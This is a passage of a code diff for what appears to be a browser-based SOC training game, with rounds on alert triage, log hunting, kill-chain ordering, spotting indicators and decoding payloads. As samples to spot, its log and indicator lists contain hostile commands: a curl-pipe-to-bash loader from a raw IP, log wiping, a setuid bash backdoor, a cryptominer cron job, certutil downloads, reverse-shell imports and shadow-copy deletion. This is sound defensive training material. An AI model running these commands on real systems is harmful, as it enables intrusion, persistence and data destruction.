-  {t:"BASE64", c:"c29jYW5hbHlzdA==", a:["socanalyst"], h:"Base64 always decodes to plain text. Try atob('...') in your browser console."},
-  {t:"ROT13", c:"CUVFUVAT", a:["phishing"], h:"ROT13 shifts each letter 13 places. C becomes P, U becomes H, V becomes I."},
-  {t:"BINARY", c:"01001100 01001111 01000111 01010011", a:["logs"], h:"Each 8-bit group is one character. 01001100 is 76, which is L."},
-  {t:"HEX", c:"6d616c776172 65".replace(" ",""), a:["malware"], h:"Convert each pair of hex digits to ASCII. 6d is 109, which is m."},
-  {t:"BASE64", c:"emVybyB0cnVzdA==", a:["zero trust"], h:"Two words. Decodes to a security architecture principle."},
-  {t:"ROT13", c:"ZNYJNER", a:["malware"], h:"Z becomes M, N becomes A, Y becomes L."},
-  {t:"HEX", c:"6b656e7961", a:["kenya"], h:"Five characters. 6b is 107, which is k."},
-  {t:"BINARY", c:"01001101 01000110 01000001", a:["mfa"], h:"Three characters. An authentication control."}
-];
-var ci=0, cs=0;
-
-function cRender(){
-  var l=CIPH[ci];
-  document.getElementById('c-lvl').textContent=ci+1;
-  document.getElementById('c-score').textContent=cs;
-  document.getElementById('c-type').textContent=l.t;
-  document.getElementById('c-code').textContent=l.c;
-  document.getElementById('c-in').value='';
-  document.getElementById('c-fb').className='gm-feedback';
+function stop(){clearInterval(G.tick);G.tick=null;tbar.style.width='100%'}
+function countdown(ms,onEnd){
+  stop(); var t=ms, step=50;
+  tbar.style.width='100%';
+  G.tick=setInterval(function(){
+    t-=step; var p=Math.max(0,t/ms*100); tbar.style.width=p+'%';
+    if(t<=0){stop(); onEnd&&onEnd()}
+  },step);
 }
+function award(pts){
+  G.score+=pts;
+  hud();
+}
+function finish(title,note){
+  stop();
+  var gained=Math.round(G.score/2);
+  S.xp+=gained;
+  if(!S.best[G.id]||G.score>S.best[G.id]) S.best[G.id]=G.score;
+  save(); paintRank();
+  play.innerHTML='<div class="rg-res">'+
+    '<div class="rg-res-n">'+G.score+'</div>'+
+    '<p class="rg-res-t">'+title+'</p>'+
+    '<p class="rg-res-s">'+note+'<br><b style="color:var(--mint)">+'+gained+' XP</b></p>'+
+    '<div class="rg-res-b">'+
+      '<button class="rg-next" id="rg-again">Run it again</button>'+
+      '<button class="rg-back" id="rg-menu2">Back to range</button>'+
+    '</div></div>';
+  document.getElementById('rg-again').onclick=function(){open(G.id)};
+  document.getElementById('rg-menu2').onclick=function(){stage.hidden=true;menu.hidden=false;paintMenu()};
+}
+function open(id){
+  var g=GAMES.filter(function(x){return x.id===id})[0];
+  G={id:id,score:0,streak:0,round:0,total:0,timer:null,tick:null};
+  menu.hidden=true; stage.hidden=false;
+  document.getElementById('rg-stage-name').textContent=g.n;
+  hud(); stop();
+  ({triage:triage,hunt:hunt,chain:chain,ioc:ioc,decode:decode,cmd:cmd})[id]();
+}
+function shuffle(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=Math.random()*(i+1)|0;var t=a[i];a[i]=a[j];a[j]=t}return a}
 
-window.cCheck=function(){
-  var v=document.getElementById('c-in').value.trim().toLowerCase();
-  if(!v) return;
-  var l=CIPH[ci], fb=document.getElementById('c-fb');
-  if(l.a.some(function(x){return v===x;})){
-    cs+=50;
-    ci++;
-    if(ci>=CIPH.length){
-      fb.className='gm-feedback right';
-      fb.innerHTML='<strong>All levels cleared.</strong> Final score: '+cs+' points. These four encodings cover most of what turns up in obfuscated payloads and C2 traffic.';
-      document.getElementById('c-code').textContent='✓ COMPLETE';
-      document.getElementById('c-in').disabled=true;
-      document.getElementById('c-score').textContent=cs;
-      return;
+/* ══════ 1. TRIAGE QUEUE ══════ */
+var ALERTS=[
+ {r:'Multiple failed logons then success',f:[['host','FIN-WS-014'],['user','j.mwangi'],['detail','23 failures in 40s, then success from 41.90.x.x'],['time','02:14 EAT']],a:2,
+  w:'Escalate. Burst of failures followed by a success outside working hours is textbook brute force with a hit. Lock the account before anything else moves.'},
+ {r:'Antivirus quarantined EICAR test file',f:[['host','IT-LAB-02'],['user','svc_lab'],['detail','EICAR-Test-File in C:\\Lab\\'],['time','11:02 EAT']],a:0,
+  w:'Benign. EICAR is the standard harmless string used to verify AV is working. On a lab host it is almost certainly someone testing.'},
+ {r:'vssadmin delete shadows executed',f:[['host','SRV-FILE-01'],['user','SYSTEM'],['detail','vssadmin.exe delete shadows /all /quiet'],['time','03:48 EAT']],a:2,
+  w:'Escalate immediately. Deleting shadow copies has no legitimate business use on a file server and is one of the clearest pre-ransomware signals there is.'},
+ {r:'Large outbound transfer to cloud storage',f:[['host','HR-WS-007'],['user','a.kimani'],['detail','2.4 GB to mega.nz over 18 min'],['time','16:20 EAT']],a:1,
+  w:'Investigate. Could be a legitimate backup, could be exfiltration. Check whether the user has a business reason and what was in the transfer before escalating.'},
+ {r:'New admin account created',f:[['host','DC-01'],['user','helpdesk3'],['detail','user "svc_backup2" added to Domain Admins'],['time','01:33 EAT']],a:2,
+  w:'Escalate. Privileged account creation at 1am by a helpdesk account is a persistence move. Verify against change records, but treat as hostile until cleared.'},
+ {r:'Password sprayed across 40 accounts',f:[['host','VPN-GW'],['user','multiple'],['detail','one password tried against 40 users, 2 successes'],['time','22:05 EAT']],a:2,
+  w:'Escalate. Password spraying avoids lockout thresholds by trying few passwords across many accounts. Two successes means you already have compromised users.'},
+ {r:'Impossible travel detected',f:[['host','n/a'],['user','p.otieno'],['detail','Nairobi 09:12, then Kyiv 09:41'],['time','09:41 EAT']],a:1,
+  w:'Investigate. Strong signal, but VPN use and corporate proxies produce false positives constantly. Confirm the second location is not an egress point you own.'},
+ {r:'Scheduled task created running PowerShell',f:[['host','ENG-WS-021'],['user','d.wanjiru'],['detail','task runs powershell -enc <base64> daily 04:00'],['time','19:47 EAT']],a:2,
+  w:'Escalate. Encoded PowerShell on a schedule is persistence. The encoding exists specifically to defeat casual log review.'},
+ {r:'User accessed 340 customer records',f:[['host','CRM-APP'],['user','s.achieng'],['detail','340 records in 22 min, role baseline is ~25/hr'],['time','14:10 EAT']],a:1,
+  w:'Investigate. Well above baseline, but bulk access happens legitimately during migrations and audits. Ask the manager before treating it as insider theft.'},
+ {r:'Certificate expiry warning',f:[['host','WEB-EXT-03'],['user','n/a'],['detail','TLS cert expires in 14 days'],['time','08:00 EAT']],a:0,
+  w:'Benign. This is an operational hygiene ticket, not a security incident. Route it to infrastructure and move on.'},
+ {r:'LSASS memory accessed by unusual process',f:[['host','FIN-WS-009'],['user','SYSTEM'],['detail','rundll32.exe reading lsass.exe memory'],['time','05:12 EAT']],a:2,
+  w:'Escalate. That is credential dumping. Whatever process did it now likely holds domain credentials from that machine.'},
+ {r:'Employee logged in from home',f:[['host','n/a'],['user','k.njoroge'],['detail','VPN session from known residential IP, MFA passed'],['time','20:15 EAT']],a:0,
+  w:'Benign. Known IP, MFA satisfied, plausible hour. This is a normal remote working session.'}
+];
+function triage(){
+  var q=shuffle(ALERTS).slice(0,8); G.total=q.length; hud();
+  var LBL=['Benign','Investigate','Escalate'];
+  function step(){
+    if(G.round>=q.length){
+      return finish(G.score>=560?'Sharp triage':'Shift complete',
+        G.score>=560?'You called the high-severity ones fast and did not over-escalate the noise. That balance is the whole job.'
+                   :'Over-escalating burns the team out. Under-escalating misses the breach. Run it again and watch the ones you hedged on.');
     }
-    cRender();
-    fb.className='gm-feedback right';
-    fb.innerHTML='<strong>Correct.</strong> Next payload loaded.';
-  } else {
-    cs=Math.max(0,cs-10);
-    document.getElementById('c-score').textContent=cs;
-    fb.className='gm-feedback wrong';
-    fb.innerHTML='<strong>Not it.</strong> Minus 10 points. Try again.';
+    var a=q[G.round]; G.round++; hud();
+    play.innerHTML='<p class="rg-q">'+a.r+'</p><div class="rg-panel">'+
+      a.f.map(function(x){return '<div class="rg-kv"><span>'+x[0]+'</span><span>'+x[1]+'</span></div>'}).join('')+
+      '</div><div class="rg-opts">'+LBL.map(function(l,i){return '<button class="rg-o" data-v="'+i+'">'+l+'</button>'}).join('')+
+      '</div><div class="rg-fb" id="fb"></div>';
+    var done=false;
+    function answer(v){
+      if(done) return; done=true; stop();
+      var btns=play.querySelectorAll('.rg-o');
+      btns.forEach(function(b){b.disabled=true});
+      btns[a.a].classList.add('ok');
+      var ok=(v===a.a);
+      if(!ok && v>=0) btns[v].classList.add('no');
+      if(ok){G.streak++;award(60+Math.min(G.streak,5)*12)}else{G.streak=0;hud()}
+      var fb=document.getElementById('fb');
+      fb.className='rg-fb on '+(ok?'good':'bad');
+      fb.innerHTML='<b>'+(ok?(G.streak>2?'Correct. Streak x'+G.streak:'Correct.'):(v<0?'Time.':'Not this one.'))+'</b> '+a.w;
+      var n=document.createElement('button'); n.className='rg-next'; n.textContent='Next alert';
+      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
+    }
+    play.querySelectorAll('.rg-o').forEach(function(b){b.onclick=function(){answer(+b.dataset.v)}});
+    countdown(11000,function(){answer(-1)});
   }
-};
-
-window.cHint=function(){
-  cs=Math.max(0,cs-20);
-  document.getElementById('c-score').textContent=cs;
-  var fb=document.getElementById('c-fb');
-  fb.className='gm-feedback wrong';
-  fb.innerHTML='<strong>Hint:</strong> '+CIPH[ci].h;
-};
-
-document.getElementById('c-in').addEventListener('keydown',function(e){ if(e.key==='Enter') cCheck(); });
-cRender();
-
-/* ─── GAME 3: PASSWORD LAB ─────────────── */
-var COMMON=["password","123456","qwerty","admin","letmein","welcome","monkey","dragon","football","iloveyou","abc123","kenya","safaricom","nairobi","password1","admin123"];
-
-function fmtTime(sec){
-  if(sec<1) return "instantly";
-  var u=[["second",60],["minute",60],["hour",24],["day",365],["year",100],["century",Infinity]];
-  var v=sec;
-  for(var i=0;i<u.length;i++){
-    if(v<u[i][1]) return Math.round(v)+" "+u[i][0]+(Math.round(v)===1?"":"s");
-    v=v/u[i][1];
-  }
-  return "longer than the age of the universe";
+  step();
 }
 
-document.getElementById('w-in').addEventListener('input',function(){
-  var p=this.value;
-  var pool=0;
-  if(/[a-z]/.test(p)) pool+=26;
-  if(/[A-Z]/.test(p)) pool+=26;
-  if(/[0-9]/.test(p)) pool+=10;
-  if(/[^a-zA-Z0-9]/.test(p)) pool+=33;
-
-  var lower=p.toLowerCase();
-  var isCommon=COMMON.some(function(c){return lower.indexOf(c)!==-1;});
-  var bits = p.length ? Math.round(p.length*Math.log2(pool||1)) : 0;
-  if(isCommon) bits=Math.min(bits,18);
-
-  var guesses=Math.pow(2,bits)/2;
-  var secs=guesses/1e11;
-
-  document.getElementById('w-bits').textContent=bits;
-
-  var pct=Math.min(100,(bits/90)*100);
-  var bar=document.getElementById('w-bar');
-  bar.style.width=pct+'%';
-  var col = bits<28?'#ff5f56' : bits<45?'#ffbd2e' : bits<65?'#7eb2ec' : '#27c93f';
-  bar.style.background=col;
-
-  var lbl = !p.length?'Type something to begin' :
-            bits<28?'Very weak' : bits<45?'Weak' : bits<65?'Reasonable' : bits<80?'Strong' : 'Very strong';
-  var el=document.getElementById('w-label');
-  el.textContent=lbl+(isCommon&&p.length?' — contains a common word or pattern':'');
-  el.style.color=p.length?col:'';
-
-  document.getElementById('w-crack').textContent = p.length ? 'Offline crack time: '+fmtTime(secs) : '';
-
-  document.getElementById('w-c1').className = p.length>=12?'hit':'';
-  document.getElementById('w-c2').className = (/[a-z]/.test(p)&&/[A-Z]/.test(p))?'hit':'';
-  document.getElementById('w-c3').className = /[0-9]/.test(p)?'hit':'';
-  document.getElementById('w-c4').className = /[^a-zA-Z0-9]/.test(p)?'hit':'';
-  document.getElementById('w-c5').className = (p.length&&!isCommon)?'hit':'';
-});
-
-/* ─── GAME 4: PORT MATCH ───────────────── */
-var PAIRS=[
-  ["22","SSH"],["80","HTTP"],["443","HTTPS"],["53","DNS"],
-  ["3389","RDP"],["21","FTP"],["445","SMB"],["6379","Redis"]
+/* ══════ 2. LOG HUNT ══════ */
+var BENIGN=[
+ 'sshd[2201]: Accepted publickey for deploy from 10.0.2.14 port 51022',
+ 'nginx: 10.0.1.7 "GET /api/health HTTP/1.1" 200 12',
+ 'cron[881]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)',
+ 'systemd[1]: Started Daily apt download activities.',
+ 'nginx: 10.0.1.9 "POST /api/v2/orders HTTP/1.1" 201 340',
+ 'sshd[2290]: pam_unix(sshd:session): session opened for user deploy',
+ 'kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode',
+ 'nginx: 10.0.1.3 "GET /static/app.css HTTP/1.1" 304 0',
+ 'postfix/smtp: to=<ops@corp.co.ke>, status=sent (250 2.0.0 OK)',
+ 'systemd[1]: Reloading OpenBSD Secure Shell server.',
+ 'nginx: 10.0.1.5 "GET /favicon.ico HTTP/1.1" 200 1150',
+ 'sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/systemctl restart app',
+ 'kernel: audit: type=1400 apparmor="STATUS" operation="profile_load"',
+ 'nginx: 10.0.1.8 "GET /api/v2/users/me HTTP/1.1" 200 812',
+ 'dhclient: DHCPACK of 10.0.2.14 from 10.0.0.1',
+ 'sshd[2310]: Received disconnect from 10.0.2.14 port 51022:11: disconnected by user'
 ];
-var mDeck=[], mUp=[], mMoves=0, mFound=0, mLock=false;
-
-window.mInit=function(){
-  mDeck=[]; mUp=[]; mMoves=0; mFound=0; mLock=false;
-  PAIRS.forEach(function(p,i){
-    mDeck.push({id:i,txt:p[0],type:'port'});
-    mDeck.push({id:i,txt:p[1],type:'svc'});
-  });
-  for(var i=mDeck.length-1;i>0;i--){
-    var j=Math.floor(Math.random()*(i+1));
-    var t=mDeck[i]; mDeck[i]=mDeck[j]; mDeck[j]=t;
+var MALIC=[
+ {l:'sshd[3312]: Accepted password for root from 45.83.64.19 port 44120',w:'Root login by password from an external address. Root SSH should be key-only and never exposed.'},
+ {l:'bash: curl http://185.220.101.4/x.sh | bash',w:'Piping a remote script straight into a shell from a raw IP. That is a loader, not an install step.'},
+ {l:'useradd[4410]: new user: name=svc_updt, UID=0, GID=0, home=/tmp',w:'A new account with UID 0 is a second root. Home directory in /tmp confirms it is not legitimate.'},
+ {l:'nginx: 8.42.19.66 "GET /?id=1\u0027 UNION SELECT null,version()-- HTTP/1.1" 200',w:'Classic union-based SQL injection probe, and it returned 200 rather than an error.'},
+ {l:'bash: history -c; unset HISTFILE; rm -rf /var/log/wtmp',w:'Clearing shell history and deleting login records. Nobody does this for operational reasons.'},
+ {l:'sshd[5120]: Failed password for invalid user admin from 45.83.64.19 (x214)',w:'Two hundred failures against a nonexistent account from one source. Brute force in progress.'},
+ {l:'cron[992]: (www-data) CMD (/tmp/.x/kdevtmpfsi -o pool.minexmr.com:4444)',w:'A hidden binary in /tmp pointing at a mining pool. Cryptojacking on a web server account.'},
+ {l:'bash: cp /bin/bash /tmp/.sysd && chmod u+s /tmp/.sysd',w:'A setuid copy of bash hidden in /tmp. That is a root backdoor for later.'}
+];
+function hunt(){
+  G.total=6; hud();
+  function round(){
+    if(G.round>=G.total){
+      return finish(G.score>=520?'Fast eyes':'Range complete',
+        G.score>=520?'You are reading log structure rather than reading every word. That is exactly how it works at volume.'
+                   :'The trick is scanning for shape, not content. Odd IPs, /tmp paths, UID 0, piped downloads. Run it again.');
+    }
+    G.round++; hud();
+    var bad=MALIC[Math.random()*MALIC.length|0];
+    var lines=shuffle(BENIGN).slice(0,13+G.round);
+    var at=Math.random()*(lines.length+1)|0;
+    lines.splice(at,0,bad.l);
+    var t=Math.max(4200,9000-G.round*750);
+    play.innerHTML='<p class="rg-q">One line here is hostile. Round '+G.round+'.</p>'+
+      '<div class="rg-logs">'+lines.map(function(l,i){
+        return '<div class="rg-ln" data-i="'+i+'">'+l.replace(/</g,'&lt;')+'</div>'}).join('')+
+      '</div><div class="rg-fb" id="fb"></div>';
+    var done=false;
+    function end(picked){
+      if(done) return; done=true; stop();
+      var els=play.querySelectorAll('.rg-ln');
+      els[at].classList.add('hit');
+      var ok=(picked===at);
+      if(!ok&&picked>-1) els[picked].classList.add('miss');
+      if(ok){G.streak++;award(70+Math.round(t/120)+Math.min(G.streak,5)*10)}else{G.streak=0;hud()}
+      var fb=document.getElementById('fb');
+      fb.className='rg-fb on '+(ok?'good':'bad');
+      fb.innerHTML='<b>'+(ok?'Found it.':(picked>-1?'Wrong line.':'Time.'))+'</b> '+bad.w;
+      var n=document.createElement('button');n.className='rg-next';n.textContent='Next round';
+      n.onclick=round; fb.appendChild(document.createElement('br')); fb.appendChild(n);
+    }
+    play.querySelectorAll('.rg-ln').forEach(function(el){el.onclick=function(){end(+el.dataset.i)}});
+    countdown(t,function(){end(-1)});
   }
-  var g=document.getElementById('m-grid');
-  g.innerHTML='';
-  mDeck.forEach(function(c,idx){
-    var d=document.createElement('div');
-    d.className='gm-tile';
-    d.dataset.idx=idx;
-    d.innerHTML='<span class="q">?</span><span class="face">'+c.txt+'</span>';
-    d.addEventListener('click',function(){ mFlip(idx,d); });
-    g.appendChild(d);
-  });
-  document.getElementById('m-moves').textContent=0;
-  document.getElementById('m-found').textContent=0;
-  document.getElementById('m-fb').className='gm-feedback';
-};
+  round();
+}
 
-function mFlip(idx,el){
-  if(mLock||el.classList.contains('up')||el.classList.contains('done')) return;
-  el.classList.add('up');
-  mUp.push({idx:idx,el:el});
-  if(mUp.length===2){
-    mMoves++;
-    document.getElementById('m-moves').textContent=mMoves;
-    mLock=true;
-    var a=mDeck[mUp[0].idx], b=mDeck[mUp[1].idx];
-    if(a.id===b.id && a.type!==b.type){
-      setTimeout(function(){
-        mUp.forEach(function(u){u.el.classList.remove('up');u.el.classList.add('done');});
-        mUp=[]; mLock=false; mFound++;
-        document.getElementById('m-found').textContent=mFound;
-        if(mFound===PAIRS.length){
-          var fb=document.getElementById('m-fb');
-          fb.className='gm-feedback right';
-          var rating = mMoves<=12?'Excellent recall.' : mMoves<=18?'Good.' : 'Cleared it.';
-          fb.innerHTML='<strong>All matched in '+mMoves+' moves. '+rating+'</strong> These eight are the ports you will meet on almost every scan. 6379 is the one people miss, because Redis sits outside nmap default top 1000.';
+/* ══════ 3. KILL CHAIN ══════ */
+var CHAINS=[
+ {n:'Ransomware intrusion',s:[
+  'Phishing email with macro document opened by finance user',
+  'Macro downloads and runs a loader from an external host',
+  'Loader dumps credentials from LSASS memory',
+  'Attacker moves laterally to the file server using stolen creds',
+  'Backup agent service is stopped and shadow copies deleted',
+  'Sensitive data archived and uploaded to external storage',
+  'Ransomware payload deployed across the domain']},
+ {n:'Credential-driven breach',s:[
+  'Infostealer harvests browser credentials from a personal laptop',
+  'Credentials sold on an access broker market',
+  'Attacker authenticates to the VPN with valid credentials',
+  'Session token stolen to bypass MFA on cloud apps',
+  'Attacker enrols a new MFA device for persistence',
+  'Mailbox rule created to auto-delete finance alerts',
+  'Fraudulent supplier payment authorised and released']},
+ {n:'Web application compromise',s:[
+  'Attacker enumerates the application and finds an exposed endpoint',
+  'SQL injection confirmed on an unsanitised parameter',
+  'Database dumped including password hashes',
+  'Hashes cracked offline against a wordlist',
+  'Admin panel accessed with a recovered password',
+  'Web shell uploaded through the file upload feature',
+  'Server used as a pivot into the internal network']}
+];
+function chain(){
+  var c=CHAINS[Math.random()*CHAINS.length|0];
+  G.total=c.s.length; hud();
+  var order=shuffle(c.s.map(function(s,i){return {t:s,i:i}}));
+  var picked=[], correct=0;
+  function paint(){
+    play.innerHTML='<p class="rg-q">'+c.n+'. Put these seven events back in the order they happened.</p>'+
+      '<div class="rg-slots">'+(picked.length?picked.map(function(p,i){
+        return '<span class="rg-slot">'+(i+1)+'. '+p.t.slice(0,34)+(p.t.length>34?'\u2026':'')+'</span>'}).join(''):
+        '<span class="rg-slot" style="opacity:.4;background:transparent;border-style:dashed">start with the first thing that happened</span>')+'</div>'+
+      '<div class="rg-chain">'+order.map(function(o,idx){
+        var used=picked.indexOf(o)>-1;
+        return '<div class="rg-step'+(used?' used':'')+'" data-x="'+idx+'"><span class="rg-step-n">'+
+          (used?(picked.indexOf(o)+1):'\u2022')+'</span>'+o.t+'</div>'}).join('')+
+      '</div><div class="rg-fb" id="fb"></div>';
+    play.querySelectorAll('.rg-step').forEach(function(el){
+      el.onclick=function(){
+        var o=order[+el.dataset.x];
+        if(picked.indexOf(o)>-1) return;
+        var expect=picked.length;
+        picked.push(o); G.round=picked.length;
+        if(o.i===expect){correct++;G.streak++;award(80+Math.min(G.streak,5)*15)}else{G.streak=0;hud()}
+        if(picked.length===order.length){
+          stop();
+          var pct=Math.round(correct/order.length*100);
+          return finish(pct===100?'Perfect chain':(pct>=60?'Mostly right':'Chain broken'),
+            pct===100?'Seven for seven. You are thinking about intrusions as sequences, which is what turns alerts into a story.'
+                     :correct+' of '+order.length+' in the right position. The order matters because it tells you where you can still intervene.');
         }
-      },420);
-    } else {
-      setTimeout(function(){
-        mUp.forEach(function(u){u.el.classList.remove('up');});
-        mUp=[]; mLock=false;
-      },750);
-    }
+        paint();
+      };
+    });
   }
+  paint();
 }
 
-mInit();
+/* ══════ 4. IOC OR NOISE ══════ */
+var IOCS=[
+ ['185.220.101.44',1,'Known Tor exit node range. Not automatically hostile, but never normal for a corporate egress.'],
+ ['8.8.8.8',0,'Google public DNS. One of the most common addresses on any network.'],
+ ['powershell -enc SQBFAFgA',1,'Encoded PowerShell. The encoding exists to hide the command from log review.'],
+ ['C:\\Program Files\\Google\\Chrome',0,'Standard Chrome install path.'],
+ ['xn--pple-43d.com',1,'Punycode homograph. Renders as "apple.com" but is a different domain entirely.'],
+ ['svchost.exe',0,'Legitimate Windows service host. Suspicious only when the path or parent is wrong.'],
+ ['C:\\Users\\Public\\svchost.exe',1,'Right name, wrong place. Real svchost lives in System32, never in Public.'],
+ ['/var/log/auth.log',0,'Standard Linux authentication log path.'],
+ ['1nvoice-paypa1.com',1,'Typosquat using the digit one for the letter l. Built to be misread at a glance.'],
+ ['mimikatz.exe',1,'Credential dumping tool. There is no benign reason for it on a production host.'],
+ ['10.0.1.24',0,'RFC 1918 private address. Ordinary internal host.'],
+ ['certutil -urlcache -f http://',1,'Living off the land download. certutil is a signed Microsoft binary being abused as a downloader.'],
+ ['GET /api/v2/health',0,'Routine health check endpoint.'],
+ ['vssadmin delete shadows /all',1,'Shadow copy deletion. One of the highest fidelity pre-ransomware signals there is.'],
+ ['nginx/1.24.0',0,'Standard web server version banner.'],
+ ['ZmxhZ3tzMGNfNG40bHkVDN9',1,'Base64 blob in an unexpected field. Worth decoding before you dismiss it.'],
+ ['Mozilla/5.0 (Windows NT 10.0)',0,'Common browser user agent string.'],
+ ['python -c "import socket,subprocess,os"',1,'Opening imports for a reverse shell one-liner.'],
+ ['DHCPACK from 10.0.0.1',0,'Normal DHCP lease acknowledgement.'],
+ ['net user /add backdoor P@ss',1,'Account creation from the command line with an obvious name. Persistence.']
+];
+function ioc(){
+  var q=shuffle(IOCS); G.total=q.length; hud();
+  function step(){
+    if(G.round>=q.length){
+      return finish(G.score>=700?'Fast and accurate':'Round complete',
+        G.score>=700?'You are recognising shape rather than reading carefully, which is what speed at volume actually requires.'
+                   :'The hard ones are the legitimate binaries in the wrong place. Path matters as much as name.');
+    }
+    var it=q[G.round]; G.round++; hud();
+    play.innerHTML='<p class="rg-q" style="font-family:var(--m);font-size:1.05rem;word-break:break-all;background:var(--surf2);padding:20px;border-radius:9px;border:1px solid var(--line)">'+
+      it[0].replace(/</g,'&lt;')+'</p>'+
+      '<div class="rg-opts"><button class="rg-o" data-v="0">Noise</button><button class="rg-o" data-v="1">Indicator</button></div>'+
+      '<div class="rg-fb" id="fb"></div>';
+    var done=false;
+    function ans(v){
+      if(done)return; done=true; stop();
+      var bs=play.querySelectorAll('.rg-o'); bs.forEach(function(b){b.disabled=true});
+      bs[it[1]].classList.add('ok');
+      var ok=(v===it[1]);
+      if(!ok&&v>-1) bs[v].classList.add('no');
+      if(ok){G.streak++;award(40+Math.min(G.streak,8)*10)}else{G.streak=0;hud()}
+      var fb=document.getElementById('fb');
+      fb.className='rg-fb on '+(ok?'good':'bad');
+      fb.innerHTML='<b>'+(ok?(G.streak>3?'Correct. x'+G.streak:'Correct.'):'No.')+'</b> '+it[2];
+      setTimeout(step,ok?900:2100);
+    }
+    play.querySelectorAll('.rg-o').forEach(function(b){b.onclick=function(){ans(+b.dataset.v)}});
+    countdown(5000,function(){ans(-1)});
+  }
+  step();
+}
+
+/* ══════ 5. PAYLOAD DECODER ══════ */
+var PAY=[
+ ['BASE64','ZXhmaWx0cmF0aW9u',['exfiltration'],'Base64. Decodes to a single word describing data leaving the network.'],
+ ['ROT13','ONPXQBBE',['backdoor'],'ROT13. O becomes B, N becomes A, P becomes C.'],
+ ['HEX','7061796c6f6164',['payload'],'Hex to ASCII. 70 is 112, which is p.'],
+ ['BASE64','bGF0ZXJhbCBtb3ZlbWVudA==',['lateral movement'],'Two words. What an attacker does after the first foothold.'],
+ ['BINARY','01110010 01101111 01101111 01110100',['root'],'Four characters. The account everyone is trying to reach.'],
+ ['ROT13','CRAGRFG',['pentest'],'C becomes P, R becomes E, A becomes N.'],
+ ['HEX','62656163306e',['beac0n'],'Note the zero. Attackers substitute characters to dodge naive string matching.'],
+ ['BASE64','cGVyc2lzdGVuY2U=',['persistence'],'The tactic that keeps access alive after the first door is closed.']
+];
+function decode(){
+  var q=shuffle(PAY); G.total=q.length; hud();
+  function step(){
+    if(G.round>=q.length){
+      return finish(G.score>=520?'Decoder clean':'Session complete',
+        G.score>=520?'These four encodings cover most of what turns up in obfuscated payloads and C2 traffic.'
+                   :'Base64 ends in padding. Hex comes in pairs. Binary comes in eights. Once you see the shape the rest is mechanical.');
+    }
+    var p=q[G.round]; G.round++; hud();
+    play.innerHTML='<p class="rg-q">Intercepted payload. Encoding: <b style="color:var(--mint)">'+p[0]+'</b></p>'+
+      '<div class="rg-panel" style="font-family:var(--m);font-size:1rem;text-align:center;letter-spacing:1px;color:var(--mint);word-break:break-all">'+p[1]+'</div>'+
+      '<input id="dc" style="width:100%;padding:12px 14px;font-family:var(--m);font-size:.92rem;border-radius:8px;border:1px solid var(--line);background:var(--surf2);color:var(--ice);outline:none" placeholder="decoded value..." autocomplete="off" spellcheck="false">'+
+      '<div class="rg-opts" style="margin-top:12px"><button class="rg-o" id="sub">Submit</button></div>'+
+      '<div class="rg-fb" id="fb"></div>';
+    var inp=document.getElementById('dc'); inp.focus();
+    var done=false;
+    function ans(timeout){
+      if(done)return;
+      var v=(inp.value||'').trim().toLowerCase();
+      var ok=p[2].some(function(x){return v===x});
+      if(!ok&&!timeout){
+        G.streak=0; award(-10); 
+        var f=document.getElementById('fb');
+        f.className='rg-fb on bad'; f.innerHTML='<b>Not it.</b> Try again before the timer runs out.';
+        return;
+      }
+      done=true; stop();
+      if(ok){G.streak++;award(90+Math.min(G.streak,5)*15)}else{G.streak=0;hud()}
+      var fb=document.getElementById('fb');
+      fb.className='rg-fb on '+(ok?'good':'bad');
+      fb.innerHTML='<b>'+(ok?'Decoded.':'Time. It was "'+p[2][0]+'".')+'</b> '+p[3];
+      var n=document.createElement('button');n.className='rg-next';n.textContent='Next payload';
+      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
+    }
+    document.getElementById('sub').onclick=function(){ans(false)};
+    inp.onkeydown=function(e){if(e.key==='Enter')ans(false)};
+    countdown(20000,function(){ans(true)});
+  }
+  step();
+}
+
+/* ══════ 6. INCIDENT COMMAND ══════ */
+var SCEN=[
+ {t:'03:12. EDR flags mass file encryption on three servers in the finance segment. What is your first move?',
+  o:[['Start restoring from backup immediately',-1,'Restoring while the attacker still has access means they encrypt your restored data too. Containment comes first.'],
+     ['Isolate the three hosts from the network',2,'Correct. Contain before you investigate. Stopping the spread is worth more than any evidence you might lose.'],
+     ['Email the whole company a warning',0,'Not harmful, but it is not containment and it tips off an attacker who is still inside.']]},
+ {t:'Isolation holds. Your EDR shows the same parent process on eleven more hosts, not yet encrypting. Next?',
+  o:[['Isolate all eleven now',2,'Right. Those are staged. You have a narrow window before the payload fires on them too.'],
+     ['Watch them to gather intelligence',-1,'Intelligence is worth nothing if eleven more servers encrypt while you are taking notes.'],
+     ['Run a full AV scan on each',0,'Slow, and signature scanning will likely miss what EDR already surfaced behaviourally.']]},
+ {t:'Containment is holding. Where do you look first to understand how they got in?',
+  o:[['VPN and identity authentication logs',2,'Correct. Most ransomware begins with valid credentials on remote access. Start where the door is.'],
+     ['The encrypted files themselves',-1,'The encrypted files tell you what happened at the end, not how it started.'],
+     ['The ransom note',0,'Useful for attribution and for knowing which group you are dealing with, but it does not tell you the entry vector.']]},
+ {t:'A VPN account authenticated from an unfamiliar country nine days ago, then daily since. The user is on leave. Action?',
+  o:[['Disable the account and revoke all sessions',2,'Both halves matter. Disabling without revoking sessions leaves existing tokens live.'],
+     ['Reset the password',0,'Necessary but not sufficient. Active session tokens survive a password reset.'],
+     ['Wait until the user returns to confirm',-1,'Nine days of unauthorised access is not something you sit on for a confirmation call.']]},
+ {t:'You find 40 GB was uploaded to external storage six days ago. Legal asks whether this is a notifiable breach. You say:',
+  o:[['Yes, if personal data was in scope, and the clock started when we became aware',2,'Correct. Under the Data Protection Act the 72 hours runs from awareness, not from resolution.'],
+     ['No, because we contained it',-1,'Containment does not undo exfiltration. The data is gone regardless of what you did afterwards.'],
+     ['Let me check what was in the transfer first',1,'Reasonable instinct, and you do need scope, but do not let scoping delay starting the notification clock.']]},
+ {t:'Executive asks whether to pay. What do you tell them?',
+  o:[['Payment does not guarantee deletion and it funds the next attack',2,'The honest answer. Decryption keys often fail, and published victims frequently paid.'],
+     ['Pay, it is cheaper than the downtime',-1,'It is also an unverifiable promise from a criminal enterprise, and it marks you as a paying target.'],
